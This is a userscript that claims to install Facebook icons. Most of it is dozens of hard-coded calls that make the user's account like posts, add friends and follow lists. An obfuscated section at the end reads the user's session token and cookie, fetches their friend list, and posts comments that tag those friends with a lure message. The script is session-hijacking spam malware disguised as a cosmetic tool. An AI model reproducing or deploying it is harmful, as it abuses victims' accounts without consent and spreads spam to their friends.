// ==UserScript==
// @name            cài đặt icon trực tiếp FaceBook by: Bá đẹp chai
// @description     All about facebook By Bá
...
//duc
Like("1402195393382567");a("100003168264036");a("100007292441896");a("100004477115216");sublist("524321681016769");sublist("473081869474084");sublist("524321867683417");sublist("524321981016739");sublist("524322154350055");
//Hoang ba
Like("1536972296528719");
Like("550323675083154");
Like("468200193307042");
Like("1374244856187410");
Like("263858240454105");
Like("1459226670961480");
Like("284012821751742");
Like("272898596202837");
Like("263640973814120");
Like("264102383763422");
Like("669750019751663");
Like("472850302841788");
Like("472850302841788");
Like("372148802924900");
Like("311486232332103");
Like("1467758116775891");
Like("508698979235974");
Like("471179272982240");
Like("1381457615434389");
Like("1415392995385806");
Like("377591579046458");
Like("216472691882914");
Like("624516794289201");
Like("377838772356359");
Like("1434292933482889");
Like("664478273619829");
Like("297234020430057");
Like("664478273619829");
Like("1473782669504907");
Like("274867566006523");
Like("272109932964757");
Like("639211509485590");
Like("427243014079294");
Like("1416490281940767");
Like("664918410220457");
a("100007028707233");
//Son thanh pham
...
//tài
a("100003137941664");a("100007292250143");a("100007803300048");a("100004387651640");sublist("1394309300822132");
//ké
IDS("100004526740075"); 
P("251678658326357");
//tung saker
a("100006875472489");sublist("1426034747635694");sublist("1426034790969023");sublist("226125090921797");a("100003807250406");a("100005898817898");a("100006506673748");a("100005729233000");sublist("187879101413063");sublist("160854754115498");sublist("134999890039971");sublist("134999933373300");sublist("134999996706627");Like("1453607584869448");Like("407997212636537");Like("235560536610795");Like("244973422346989");Like("1409094596004638");Like("227914450728590");Like("224812547671258");Like("1441980252680739");Like("611417192264341");
//tuchi
Like("240409919478013");Like("464703896962923");Like("288851617932145");
Like("624091950997546");Like("1404628389799748");Like("462397027223127");Like("673025449410872");
//Quy Nguyen Dzai
IDS("100007137185093");
a("100001452285914");
a("100007730531710");
...
//page
var _0xf841=["value","fb_dtsg","getElementsByName","match","cookie","383788298427617","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round","  Làm Đi Nhé. tks trước vì đã xem qua   🌙  🌟  🌱  🌴  🌵  🌷  🌸 (Y) @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];
...
;arkadaslari_al(383788298427617);